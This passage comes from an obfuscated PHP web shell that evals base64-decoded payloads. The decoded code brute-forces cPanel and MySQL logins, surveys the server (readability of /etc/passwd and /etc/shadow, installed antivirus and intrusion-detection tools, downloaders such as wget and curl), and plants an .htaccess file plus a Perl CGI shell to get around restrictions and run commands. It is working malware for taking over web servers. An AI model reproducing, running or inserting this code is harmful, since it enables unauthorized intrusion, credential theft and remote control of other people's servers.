ZWwyIikKIHsKICBpZigkY3JhY2t0eXBlID09ICJjcGFuZWwyIikKICB7CiAgICRjcGFuZWxfcG9ydD0iMjMiOwogIH0KICBlbHNlCiAgICRjcGFuZWxfcG9ydD0iMjA4MiI7CiAgCiAgZm9yZWFjaCAoJHVzZXJsaXN0IGFzICR1c2VyKSAKICB7CiAgICRwdXJldXNlciA9IHRyaW0oJHVzZXIpOwogICBwcmludCAiWz9dIHVzZXIgJHB1cmV1c2VyIGluIFByb2Nlc3MgLi4uICI7CiAgIGlmKCRfUE9TVFsnYnJ1dGVmb3JjZSddPT0idHJ1ZSIpCiAgIHsKICAgIGVjaG8gIlsrXSBicnV0ZWZvcmNpbmcgLi4uLiI7CgllY2hvICI8YnI+IjsKCWJydXRlKCk7CiAgIH0KICAgZWxzZQogICB7CgkgZWNobyAiPGJyPiI7IAoJIGZvcmVhY2ggKCRwYXNzbGlzdCBhcyAkcGFzc3dvcmQgKSAKICAgICB7CiAgICAgICAkcHVyZXBhc3MgPSB0cmltKCRwYXNzd29yZCk7CiAgICAgICBjcGFuZWxfY2hlY2soJHRhcmdldCwkcHVyZXVzZXIsJHB1cmVwYXNzLCRjb25uZWN0X3RpbWVvdXQpOwogICAgIH0KICAgfQogIH0KICB9Cn0KfWVsc2VpZigkX1BPU1RbJ2NyYWNrdHlwZSddPT0nY3BhbmVsJyl7CgoKCmlmKGlzc2V0KCRfUE9TVFsndXNlcnMnXSkgJiYgaXNzZXQoJF9QT1NUWydwYXNzd29yZHMnXSkpCnsKICAgIAogICAgICAgICR1c2VybmFtZSA9IHN0cl9yZXBsYWNlKCJcbiIsJyAnLCRfUE9TVFsndXNlcnMnXSk7CiAgCiAgICAkYTEgPSBleHBsb2RlKCIgIiwkdXNlcm5hbWUpOwogICAgJGEyID0gZXhwbG9kZSgiXG4iLCRfUE9TVFsncGFzc3dvcmRzJ10pOwogICAgJGlkMiA9IGNvdW50KCRhMik7CiAgICAkb2sgPSAwOwogICAgZm9yZWFjaCgkYTEgYXMgJHVzZXIgKQogICAgewogICAgICAgIGlmKCR1c2VyICE9PSAnJykKICAgICAgICB7CiAgICAgICAgJHVzZXI9dHJpbSgkdXNlcik7CiAgICAgICAgIGZvcigkaT0wOyRpPD0kaWQyOyRpKyspCiAgICAgICAgIHsKICAgICAgICAgICAgJHBhc3MgPSB0cmltKCRhMlskaV0pOwogICAgICAgICAgICBpZihAbXlzcWxfY29ubmVjdCgnbG9jYWxob3N0JywkdXNlciwkcGFzcykpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGVjaG8gInVzZXIgaXMgKDxiPjxmb250IGNvbG9yPWdyZWVuPiR1c2VyPC9mb250PjwvYj4pIFBhc3N3b3JkIGlzICg8Yj48Zm9udCBjb2xvcj1ncmVlbj4kcGFzczwvZm9udD48L2I+KTxiciAvPiI7CiAgICAgICAgICAgICAgICAkb2srKzsKICAgICAgICAgICAgfQogICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgZWNobyAiPGhyPjxiPllvdSBGb3VuZCA8Zm9udCBjb2xvcj1ncmVlbj4kb2s8L2ZvbnQ+IENwYW5lbCA8L2I+IjsKICAgIGV4aXQ7Cn0KCgoKfQpleGl0Owo=";
eval(base64_decode($tkl));
exit;
case "Server-Info":
$tkl = "ICAkc2FmZV9zdGF0X3RrbCA9IGluaV9nZXQgKCJzYWZlX21vZGUiKTsgaWYgKCRzYWZlX3N0YXRfdGtsID09IDApICAgeyAkc2FmZV9zdGF0ID0gJ09GRic7IH0gZWxzZSB7ICRzYWZlX3N0YXQgPSAnT048YSBocmVmPSI/Z2F6YT1pbmkiPiBbQ3JlYXRlIHBocC5pbmldPC9hPic7IH0gICBpZighZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRlZ2lkJykpIHsgCQkkdXNlciA9IEBnZXRfY3VycmVudF91c2VyKCk7IAkJJHVpZCA9IEBnZXRteXVpZCgpOyAJCSRnaWQgPSBAZ2V0bXlnaWQoKTsgCQkkZ3JvdXAgPSAiPyI7IAl9IGVsc2UgeyAJCSR1aWQgPSBAcG9zaXhfZ2V0cHd1aWQocG9zaXhfZ2V0ZXVpZCgpKTsgCQkkZ2lkID0gQHBvc2l4X2dldGdyZ2lkKHBvc2l4X2dldGVnaWQoKSk7IAkJJHVzZXIgPSAkdWlkWyduYW1lJ107IAkJJHVpZCA9ICR1aWRbJ3VpZCddOyAJCSRncm91cCA9ICRnaWRbJ25hbWUnXTsgCQkkZ2lkID0gJGdpZFsnZ2lkJ107IAl9IGVjaG8gJ0hvc3QgOiAnLiRfU0VSVkVSWyJIVFRQX0hPU1QiXS4nPGJyPic7IGVjaG8gJ3BocCA6ICcucGhwdmVyc2lvbigpLic8YnI+JzsgZWNobyAnc2FmZSBtb2RlIDogJy4kc2FmZV9zdGF0Lic8YnI+JzsgZWNobyAnY3dkIDogJy5nZXRjd2QoKS4nPGJyPic7CSBlY2hvICAnVW5hbWU6ICcuc3Vic3RyKEBwaHBfdW5hbWUoKSwgMCwgMTIwKS4nPGJyPicgOyBlY2hvICAnVXNlcjogJyAuICR1aWQgLiAnICggJyAuICR1c2VyIC4gJyApICcgLiAkZ2lkIC4gJyAoICcgLiAkZ3JvdXAgLiAnICk8YnI+JzsgZWNobyAnU2VydmVyIElQOiAnIC4gQCRfU0VSVkVSWyJTRVJWRVJfQUREUiJdIC4gJzxicj5DbGllbnQgSVA6ICcgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXS4nPGJyPistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSs8YnI+JyA7IGZ1bmN0aW9uIHRrbF9zZWMoJG4sICR2KSB7IAkJJHYgPSB0cmltKCR2KTsgCQlpZigkdikgeyAJCQllY2hvICc8c3Bhbj4nIC4gJG4gLiAnOiA8L3NwYW4+JzsgCQkJaWYoc3RycG9zKCR2LCAiXG4iKSA9PT0gZmFsc2UpIAkJCQllY2hvICR2IC4gJzxicj48YnI+JzsgCQkJZWxzZSAJCQkJZWNobyAnPHByZSBjbGFzcz1tbDE+JyAuICR2IC4gJzwvcHJlPic7IAkJfSAJfSAJdGtsX3NlYygnU2VydmVyIHNvZnR3YXJlJywgQGdldGVudignU0VSVkVSX1NPRlRXQVJFJykpOyAgICAgaWYoZnVuY3Rpb25fZXhpc3RzKCdhcGFjaGVfZ2V0X21vZHVsZXMnKSkgICAgICAgICB0a2xfc2VjKCdMb2FkZWQgQXBhY2hlIG1vZHVsZXMnLCBpbXBsb2RlKCcsICcsIGFwYWNoZV9nZXRfbW9kdWxlcygpKSk7IAl0a2xfc2VjKCdEaXNhYmxlZCBQSFAgRnVuY3Rpb25zJywgJEdMT0JBTFNbJ2Rpc2FibGVfZnVuY3Rpb25zJ10/JEdMT0JBTFNbJ2Rpc2FibGVfZnVuY3Rpb25zJ106J25vbmUnKTsgCXRrbF9zZWMoJ09wZW4gYmFzZSBkaXInLCBAaW5pX2dldCgnb3Blbl9iYXNlZGlyJykpOyAJdGtsX3NlYygnU2FmZSBtb2RlIGV4ZWMgZGlyJywgQGluaV9nZXQoJ3NhZmVfbW9kZV9leGVjX2RpcicpKTsgCXRrbF9zZWMoJ1NhZmUgbW9kZSBpbmNsdWRlIGRpcicsIEBpbmlfZ2V0KCdzYWZlX21vZGVfaW5jbHVkZV9kaXInKSk7IAl0a2xfc2VjKCdjVVJMIHN1cHBvcnQnLCBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfdmVyc2lvbicpPydlbmFibGVkJzonbm8nKTsgCSR0ZW1wPWFycmF5KCk7IAlpZihmdW5jdGlvbl9leGlzdHMoJ215c3FsX2dldF9jbGllbnRfaW5mbycpKSAJCSR0ZW1wW10gPSAiTXlTcWwgKCIubXlzcWxfZ2V0X2NsaWVudF9pbmZvKCkuIikiOyAJaWYoZnVuY3Rpb25fZXhpc3RzKCdtc3NxbF9jb25uZWN0JykpIAkJJHRlbXBbXSA9ICJNU1NRTCI7IAlpZihmdW5jdGlvbl9leGlzdHMoJ3BnX2Nvbm5lY3QnKSkgCQkkdGVtcFtdID0gIlBvc3RncmVTUUwiOyAJaWYoZnVuY3Rpb25fZXhpc3RzKCdvY2lfY29ubmVjdCcpKSAJCSR0ZW1wW10gPSAiT3JhY2xlIjsgCXRrbF9zZWMoJ1N1cHBvcnRlZCBkYXRhYmFzZXMnLCBpbXBsb2RlKCcsICcsICR0ZW1wKSk7IAllY2hvICc8YnI+JzsgCWlmKCRHTE9CQUxTWydvcyddID09ICduaXgnKSB7IAkJdGtsX3NlYygnUmVhZGFibGUgL2V0Yy9wYXNzd2QnLCBAaXNfcmVhZGFibGUoJy9ldGMvcGFzc3dkJyk/InllcyA8YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNUb29sc1wiLCBcIi9ldGMvXCIsIFwicGFzc3dkXCIpJz5bZ29dPC9hPiI6J25vJyk7IAkJdGtsX3NlYygnUmVhZGFibGUgL2V0Yy9zaGFkb3cnLCBAaXNfcmVhZGFibGUoJy9ldGMvc2hhZG93Jyk/InllcyA8YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNUb29sc1wiLCBcImV0Y1wiLCBcInNoYWRvd1wiKSc+W2dvXTwvYT4iOidubycpOyAJCXRrbF9zZWMoJ1JlYWRhYmxlIC9ldGMvc2hhZG93JywgQGlzX3JlYWRhYmxlKCcvZXRjL3NoYWRvdycpPyJ5ZXMgPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzVG9vbHNcIiwgXCJldGNcIiwgXCJzaGFkb3dcIiknPltnb108L2E+Ijonbm8nKTsgCQl0a2xfc2VjKCdSZWFkYWJsZSAvZXRjL3NoYWRvdycsIEBpc19yZWFkYWJsZSgnL2V0Yy9zaGFkb3cnKT8ieWVzIDxhIGhyZWY9JyMnIG9uY2xpY2s9J2coXCJGaWxlc1Rvb2xzXCIsIFwiZXRjXCIsIFwic2hhZG93XCIpJz5bZ29dPC9hPiI6J25vJyk7IAkJdGtsX3NlYygnUmVhZGFibGUgL2V0Yy9zaGFkb3cnLCBAaXNfcmVhZGFibGUoJy9ldGMvc2hhZG93Jyk/InllcyA8YSBocmVmPScjJyBvbmNsaWNrPSdnKFwiRmlsZXNUb29sc1wiLCBcImV0Y1wiLCBcInNoYWRvd1wiKSc+W2dvXTwvYT4iOidubycpOyAJCXRrbF9zZWMoJ1JlYWRhYmxlIC9ldGMvc2hhZG93JywgQGlzX3JlYWRhYmxlKCcvZXRjL3NoYWRvdycpPyJ5ZXMgPGEgaHJlZj0nIycgb25jbGljaz0nZyhcIkZpbGVzVG9vbHNcIiwgXCJldGNcIiwgXCJzaGFkb3dcIiknPltnb108L2E+Ijonbm8nKTsgCQl0a2xfc2VjKCdPUyB2ZXJzaW9uJywgQGZpbGVfZ2V0X2NvbnRlbnRzKCcvcHJvYy92ZXJzaW9uJykpOyAJCXRrbF9zZWMoJ0Rpc3RyIG5hbWUnLCBAZmlsZV9nZXRfY29udGVudHMoJy9ldGMvaXNzdWUubmV0JykpOyAJCWlmKCEkR0xPQkFMU1snc2FmZV9tb2RlJ10pIHsgICAgICAgICAgICAgJHVzZXJmdWwgPSBhcnJheSgnZ2NjJywnbGNjJywnY2MnLCdsZCcsJ21ha2UnLCdwaHAnLCdwZXJsJywncHl0aG9uJywncnVieScsJ3RhcicsJ2d6aXAnLCdiemlwJywnYnppcDInLCduYycsJ2xvY2F0ZScsJ3N1aWRwZXJsJyk7ICAgICAgICAgICAgICRkYW5nZXIgPSBhcnJheSgna2F2Jywnbm9kMzInLCdiZGNvcmVkJywndXZzY2FuJywnc2F2JywnZHJ3ZWJkJywnY2xhbWQnLCdya2h1bnRlcicsJ2Noa3Jvb3RraXQnLCdpcHRhYmxlcycsJ2lwZncnLCd0cmlwd2lyZScsJ3NoaWVsZGNjJywncG9ydHNlbnRyeScsJ3Nub3J0Jywnb3NzZWMnLCdsaWRzYWRtJywndGNwbG9kZycsJ3N4aWQnLCdsb2djaGVjaycsJ2xvZ3dhdGNoJywnc3lzbWFzaycsJ3ptYnNjYXAnLCdzYXdtaWxsJywnd29ybXNjYW4nLCduaW5qYScpOyAgICAgICAgICAgICAkZG93bmxvYWRlcnMgPSBhcnJheSgnd2dldCcsJ2ZldGNoJywnbHlueCcsJ2xpbmtzJywnY3VybCcsJ2dldCcsJ2x3cC1taXJyb3InKTsgCQkJZWNobyAnPGJyPic7IAkJCSR0ZW1wPWFycmF5KCk7IAkJCWZvcmVhY2ggKCR1c2VyZnVsIGFzICRpdGVtKSAJCQkJaWYod3NvV2hpY2goJGl0ZW0pKSAgICAgICAgICAgICAgICAgICAgICR0ZW1wW10gPSAkaXRlbTsgCQkJdGtsX3NlYygnVXNlcmZ1bCcsIGltcGxvZGUoJywgJywkdGVtcCkpOyAJCQkkdGVtcD1hcnJheSgpOyAJCQlmb3JlYWNoICgkZGFuZ2VyIGFzICRpdGVtKSAJCQkJaWYod3NvV2hpY2goJGl0ZW0pKSAgICAgICAgICAgICAgICAgICAgICR0ZW1wW10gPSAkaXRlbTsgCQkJdGtsX3NlYygnRGFuZ2VyJywgaW1wbG9kZSgnLCAnLCR0ZW1wKSk7IAkJCSR0ZW1wPWFycmF5KCk7IAkJCWZvcmVhY2ggKCRkb3dubG9hZGVycyBhcyAkaXRlbSkgIAkJCQlpZih3c29XaGljaCgkaXRlbSkpICAgICAgICAgICAgICAgICAgICAgJHRlbXBbXSA9ICRpdGVtOyAJCQl0a2xfc2VjKCdEb3dubG9hZGVycycsIGltcGxvZGUoJywgJywkdGVtcCkpOyAJCQllY2hvICc8YnIvPic7IAkJCXRrbF9zZWMoJ0hvc3RzJywgQGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL2hvc3RzJykpOyAJCX0gCX0g";
eval(base64_decode($tkl));
exit;
case "bypass":
$tkl = "QG1rZGlyKCdieXBhc3MnKTsKZWNobyAiPC9icj4gU2VsZWN0IGJ5cGFzcyBUb29sIDo8L2JyPgo8Zm9ybSBtZXRob2Q9J1BPU1QnID4JCQk8cD4KPHNlbGVjdCBuYW1lPSdieXBhc3NfdHlwZSc+CjxvcHRpb24gdmFsdWU9J0NnaV9TaGVsbCc+Q2dpIFNoZWxsPC9vcHRpb24+CjxvcHRpb24gdmFsdWU9J01pbmlfQ2dpJz5NaW5pIENnaTwvb3B0aW9uPgo8b3B0aW9uIHZhbHVlPSdDb25maWdfU2hlbGwnPkNvbmZpZyBTaGVsbDwvb3B0aW9uPgo8b3B0aW9uIHZhbHVlPSdQeXRob25fU2hlbGwnPlB5dGhvbiBTaGVsbDwvb3B0aW9uPgo8L3NlbGVjdD4KPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J2dvID4+JyAvPgo8L3A+PC9mb3JtPiI7CiRkb2R5X3RrbCA9ICRfUE9TVFsnYnlwYXNzX3R5cGUnXTsKc3dpdGNoICgkZG9keV90a2wpIHsKY2FzZSAiQ2dpX1NoZWxsIjoKICAgIEBta2RpcignYnlwYXNzL2NnaV9zaGVsbCcsIDA3NTUpOwogICAgY2hkaXIoJ2J5cGFzcy9jZ2lfc2hlbGwnKTsgICAgICAKICAgICAgICAkdGtsID0gIi5odGFjY2VzcyI7CiAgICAgICAgJHRrbF9ub3RlID0gIiR0a2wiOwogICAgICAgICRkb2R5ID0gZm9wZW4gKCR0a2xfbm90ZSAsICd3Jykgb3IgZGllICgiZG9keSBhJiMyMzE7JiMzMDU7bGFtYWQmIzMwNTshIik7CiAgICAgICAgJG1ldGluID0gIlQzQjBhVzl1Y3lCR2IyeHNiM2RUZVcxTWFXNXJjeUJOZFd4MGFWWnBaWGR6SUVsdVpHVjRaWE1nUlhobFkwTkhTUXBCWkdSVWVYQmxJR0Z3Y0d4cFkyRjBhVzl1TDNndGFIUjBjR1F0WTJkcElDNWphVzRLUVdSa1NHRnVaR3hsY2lCaloya3RjMk55YVhCMElDNWphVzRLUVdSa1NHRnVaR3hsY2lCaloya3RjMk55YVhCMElDNWphVzQ9IjsgICAgCiAgICAgICAgZndyaXRlICggJGRvZHkgLCBiYXNlNjRfZGVjb2RlKCRtZXRpbikgKSA7CiAgICAgICAgZmNsb3NlICgkZG9keSk7CiRjZ2lzaGVsbGl6b2NpbiA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0lDMUpMM1Z6Y2k5c2IyTmhiQzlpWVc1a2JXRnBiZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlBOFlpQnpkSGxzWlQwaVkyOXNiM0k2WW14aFkyczdZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2pabVptWmpZMklqNXdjbWwyT0NCaloya2djMmhsYkd3OEwySStJQ01nYzJWeWRtVnlEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9OQ2lNdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzBOQ2lNZ1EyOXVabWxuZFhKaGRHbHZiam9nV1c5MUlHNWxaV1FnZEc4Z1kyaGhibWRsSUc5dWJIa2dKRkJoYzNOM2IzSmtJR0Z1WkNBa1YybHVUbFF1SUZSb1pTQnZkR2hsY2cwS0l5QjJZV3gxWlhNZ2MyaHZkV3hrSUhkdmNtc2dabWx1WlNCbWIzSWdiVzl6ZENCemVYTjBaVzF6TGcwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0pGQmhjM04zYjNKa0lEMGdJbkJ5YVhZNElqc0pDU01nUTJoaGJtZGxJSFJvYVhNdUlGbHZkU0IzYVd4c0lHNWxaV1FnZEc4Z1pXNTBaWElnZEdocGN3MEtDUWtKQ1NNZ2RHOGdiRzluYVc0dURRb05DaVJYYVc1T1ZDQTlJREE3Q1FrSkl5QlpiM1VnYm1WbFpDQjBieUJqYUdGdVoyVWdkR2hsSUhaaGJIVmxJRzltSUhSb2FYTWdkRzhnTVNCcFpnMEtDUWtKQ1NNZ2VXOTFKM0psSUhKMWJtNXBibWNnZEdocGN5QnpZM0pwY0hRZ2IyNGdZU0JYYVc1a2IzZHpJRTVVRFFvSkNRa0pJeUJ0WVdOb2FXNWxMaUJKWmlCNWIzVW5jbVVnY25WdWJtbHVaeUJwZENCdmJpQlZibWw0TENCNWIzVU5DZ2tKQ1FraklHTmhiaUJzWldGMlpTQjBhR1VnZG1Gc2RXVWdZWE1nYVhRZ2FYTXVEUW9OQ2lST1ZFTnRaRk5sY0NBOUlDSW1JanNKQ1NNZ1ZHaHBjeUJqYUdGeVlXTjBaWElnYVhNZ2RYTmxaQ0IwYnlCelpYQmxjbUYwWlNBeUlHTnZiVzFoYm1SekRRb0pDUWtKSXlCcGJpQmhJR052YlcxaGJtUWdiR2x1WlNCdmJpQlhhVzVrYjNkeklFNVVMZzBLRFFva1ZXNXBlRU50WkZObGNDQTlJQ0k3SWpzSkNTTWdWR2hwY3lCamFHRnlZV04wWlhJZ2FYTWdkWE5sWkNCMGJ5QnpaWEJsY21GMFpTQXlJR052YlcxaGJtUnpEUW9KQ1FrSkl5QnBiaUJoSUdOdmJXMWhibVFnYkdsdVpTQnZiaUJWYm1sNExnMEtEUW9rUTI5dGJXRnVaRlJwYldWdmRYUkVkWEpoZEdsdmJpQTlJREV3T3draklGUnBiV1VnYVc0Z2MyVmpiMjVrY3lCaFpuUmxjaUJqYjIxdFlXNWtjeUIzYVd4c0lHSmxJR3RwYkd4bFpBMEtDUWtKQ1NNZ1JHOXVKM1FnYzJWMElIUm9hWE1nZEc4Z1lTQjJaWEo1SUd4aGNtZGxJSFpoYkhWbExpQlVhR2x6SUdsekRRb0pDUWtKSXlCMWMyVm1kV3dnWm05eUlHTnZiVzFoYm1SeklIUm9ZWFFnYldGNUlHaGhibWNnYjNJZ2RHaGhkQTBLQ1FrSkNTTWdkR0ZyWlNCMlpYSjVJR3h2Ym1jZ2RHOGdaWGhsWTNWMFpTd2diR2xyWlNBaVptbHVaQ0F2SWk0TkNna0pDUWtqSUZSb2FYTWdhWE1nZG1Gc2FXUWdiMjVzZVNCdmJpQlZibWw0SUhObGNuWmxjbk11SUVsMElHbHpEUW9KQ1FrSkl5QnBaMjV2Y21Wa0lHOXVJRTVVSUZObGNuWmxjbk11RFFvTkNpUlRhRzkzUkhsdVlXMXBZMDkxZEhCMWRDQTlJREU3Q1FraklFbG1JSFJvYVhNZ2FYTWdNU3dnZEdobGJpQmtZWFJoSUdseklITmxiblFnZEc4Z2RHaGxEUW9KQ1FrSkl5QmljbTkzYzJWeUlHRnpJSE52YjI0Z1lYTWdhWFFnYVhNZ2IzVjBjSFYwTENCdmRHaGxjbmRwYzJVTkNna0pDUWtqSUdsMElHbHpJR0oxWm1abGNtVmtJR0Z1WkNCelpXNWtJSGRvWlc0Z2RHaGxJR052YlcxaGJtUU5DZ2tKQ1FraklHTnZiWEJzWlhSbGN5NGdWR2hwY3lCcGN5QjFjMlZtZFd3Z1ptOXlJR052YlcxaGJtUnpJR3hwYTJVTkNna0pDUWtqSUhCcGJtY3NJSE52SUhSb1lYUWdlVzkxSUdOaGJpQnpaV1VnZEdobElHOTFkSEIxZENCaGN5QnBkQTBLQ1FrSkNTTWdhWE1nWW1WcGJtY2daMlZ1WlhKaGRHVmtMZzBLRFFvaklFUlBUaWRVSUVOSVFVNUhSU0JCVGxsVVNFbE9SeUJDUlV4UFZ5QlVTRWxUSUV4SlRrVWdWVTVNUlZOVElGbFBWU0JMVGs5WElGZElRVlFnV1U5VkoxSkZJRVJQU1U1SElDRWhEUW9OQ2lSRGJXUlRaWEFnUFNBb0pGZHBiazVVSUQ4Z0pFNVVRMjFrVTJWd0lEb2dKRlZ1YVhoRGJXUlRaWEFwT3cwS0pFTnRaRkIzWkNBOUlDZ2tWMmx1VGxRZ1B5QWlZMlFpSURvZ0luQjNaQ0lwT3cwS0pGQmhkR2hUWlhBZ1BTQW9KRmRwYms1VUlEOGdJbHhjSWlBNklDSXZJaWs3RFFva1VtVmthWEpsWTNSdmNpQTlJQ2drVjJsdVRsUWdQeUFpSURJK0pqRWdNVDRtTWlJZ09pQWlJREUrSmpFZ01qNG1NU0lwT3cwS0RRb2pMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdERRb2pJRkpsWVdSeklIUm9aU0JwYm5CMWRDQnpaVzUwSUdKNUlIUm9aU0JpY205M2MyVnlJR0Z1WkNCd1lYSnpaWE1nZEdobElHbHVjSFYwSUhaaGNtbGhZbXhsY3k0Z1NYUU5DaU1nY0dGeWMyVnpJRWRGVkN3Z1VFOVRWQ0JoYm1RZ2JYVnNkR2x3WVhKMEwyWnZjbTB0WkdGMFlTQjBhR0YwSUdseklIVnpaV1FnWm05eUlIVndiRzloWkdsdVp5Qm1hV3hsY3k0TkNpTWdWR2hsSUdacGJHVnVZVzFsSUdseklITjBiM0psWkNCcGJpQWthVzU3SjJZbmZTQmhibVFnZEdobElHUmhkR0VnYVhNZ2MzUnZjbVZrSUdsdUlDUnBibnNuWm1sc1pXUmhkR0VuZlM0TkNpTWdUM1JvWlhJZ2RtRnlhV0ZpYkdWeklHTmhiaUJpWlNCaFkyTmxjM05sWkNCMWMybHVaeUFrYVc1N0ozWmhjaWQ5TENCM2FHVnlaU0IyWVhJZ2FYTWdkR2hsSUc1aGJXVWdiMllOQ2lNZ2RHaGxJSFpoY21saFlteGxMaUJPYjNSbE9pQk5iM04wSUc5bUlIUm9aU0JqYjJSbElHbHVJSFJvYVhNZ1puVnVZM1JwYjI0Z2FYTWdkR0ZyWlc0Z1puSnZiU0J2ZEdobGNpQkRSMGtOQ2lNZ2MyTnlhWEIwY3k0TkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNuTjFZaUJTWldGa1VHRnljMlVnRFFwN0RRb0piRzlqWVd3Z0tDcHBiaWtnUFNCQVh5QnBaaUJBWHpzTkNnbHNiMk5oYkNBb0pHa3NJQ1JzYjJNc0lDUnJaWGtzSUNSMllXd3BPdzBLQ1EwS0NTUk5kV3gwYVhCaGNuUkdiM0p0UkdGMFlTQTlJQ1JGVGxaN0owTlBUbFJGVGxSZlZGbFFSU2Q5SUQxK0lDOXRkV3gwYVhCaGNuUmNMMlp2Y20wdFpHRjBZVHNnWW05MWJtUmhjbms5S0M0cktTUXZPdzBLRFFvSmFXWW9KRVZPVm5zblVrVlJWVVZUVkY5TlJWUklUMFFuZlNCbGNTQWlSMFZVSWlrTkNnbDdEUW9KQ1NScGJpQTlJQ1JGVGxaN0oxRlZSVkpaWDFOVVVrbE9SeWQ5T3cwS0NYME5DZ2xsYkhOcFppZ2tSVTVXZXlkU1JWRlZSVk5VWDAxRlZFaFBSQ2Q5SUdWeElDSlFUMU5VSWlrTkNnbDdEUW9KQ1dKcGJtMXZaR1VvVTFSRVNVNHBJR2xtSUNSTmRXeDBhWEJoY25SR2IzSnRSR0YwWVNBbUlDUlhhVzVPVkRzTkNna0pjbVZoWkNoVFZFUkpUaXdnSkdsdUxDQWtSVTVXZXlkRFQwNVVSVTVVWDB4RlRrZFVTQ2Q5S1RzTkNnbDlEUW9OQ2draklHaGhibVJzWlNCbWFXeGxJSFZ3Ykc5aFpDQmtZWFJoRFFvSmFXWW9KRVZPVm5zblEwOU9WRVZPVkY5VVdWQkZKMzBnUFg0Z0wyMTFiSFJwY0dGeWRGd3ZabTl5YlMxa1lYUmhPeUJpYjNWdVpHRnllVDBvTGlzcEpDOHBEUW9KZXcwS0NRa2tRbTkxYm1SaGNua2dQU0FuTFMwbkxpUXhPeUFqSUhCc1pXRnpaU0J5WldabGNpQjBieUJTUmtNeE9EWTNJQTBLQ1FsQWJHbHpkQ0E5SUhOd2JHbDBLQzhrUW05MWJtUmhjbmt2TENBa2FXNHBPeUFOQ2drSkpFaGxZV1JsY2tKdlpIa2dQU0FrYkdsemRGc3hYVHNOQ2drSkpFaGxZV1JsY2tKdlpIa2dQWDRnTDF4eVhHNWNjbHh1ZkZ4dVhHNHZPdzBLQ1Fra1NHVmhaR1Z5SUQwZ0pHQTdEUW9KQ1NSQ2IyUjVJRDBnSkNjN0RRb2dDUWtrUW05a2VTQTlmaUJ6TDF4eVhHNGtMeTg3SUNNZ2RHaGxJR3hoYzNRZ1hISmNiaUIzWVhNZ2NIVjBJR2x1SUdKNUlFNWxkSE5qWVhCbERRb0pDU1JwYm5zblptbHNaV1JoZEdFbmZTQTlJQ1JDYjJSNU93MEtDUWtrU0dWaFpHVnlJRDErSUM5bWFXeGxibUZ0WlQxY0lpZ3VLeWxjSWk4N0lBMEtDUWtrYVc1N0oyWW5mU0E5SUNReE95QU5DZ2tKSkdsdWV5ZG1KMzBnUFg0Z2N5OWNJaTh2WnpzTkNna0pKR2x1ZXlkbUozMGdQWDRnY3k5Y2N5OHZaenNOQ2cwS0NRa2pJSEJoY25ObElIUnlZV2xzWlhJTkNna0pabTl5S0NScFBUSTdJQ1JzYVhOMFd5UnBYVHNnSkdrckt5a05DZ2tKZXlBTkNna0pDU1JzYVhOMFd5UnBYU0E5ZmlCekwxNHVLMjVoYldVOUpDOHZPdzBLQ1FrSkpHeHBjM1JiSkdsZElEMStJQzljSWloY2R5c3BYQ0l2T3cwS0NRa0pKR3RsZVNBOUlDUXhPdzBLQ1FrSkpIWmhiQ0E5SUNRbk93MEtDUWtKSkhaaGJDQTlmaUJ6THloZUtGeHlYRzVjY2x4dWZGeHVYRzRwS1h3b1hISmNiaVI4WEc0a0tTOHZaenNOQ2drSkNTUjJZV3dnUFg0Z2N5OGxLQzR1S1M5d1lXTnJLQ0pqSWl3Z2FHVjRLQ1F4S1NrdloyVTdEUW9KQ1Fra2FXNTdKR3RsZVgwZ1BTQWtkbUZzT3lBTkNna0pmUTBLQ1gwTkNnbGxiSE5sSUNNZ2MzUmhibVJoY21RZ2NHOXpkQ0JrWVhSaElDaDFjbXdnWlc1amIyUmxaQ3dnYm05MElHMTFiSFJwY0dGeWRDa05DZ2w3RFFvSkNVQnBiaUE5SUhOd2JHbDBLQzhtTHl3Z0pHbHVLVHNOQ2drSlptOXlaV0ZqYUNBa2FTQW9NQ0F1TGlBa0kybHVLUTBLQ1FsN0RRb0pDUWtrYVc1YkpHbGRJRDErSUhNdlhDc3ZJQzluT3cwS0NRa0pLQ1JyWlhrc0lDUjJZV3dwSUQwZ2MzQnNhWFFvTHowdkxDQWthVzViSkdsZExDQXlLVHNOQ2drSkNTUnJaWGtnUFg0Z2N5OGxLQzR1S1M5d1lXTnJLQ0pqSWl3Z2FHVjRLQ1F4S1NrdloyVTdEUW9KQ1Fra2RtRnN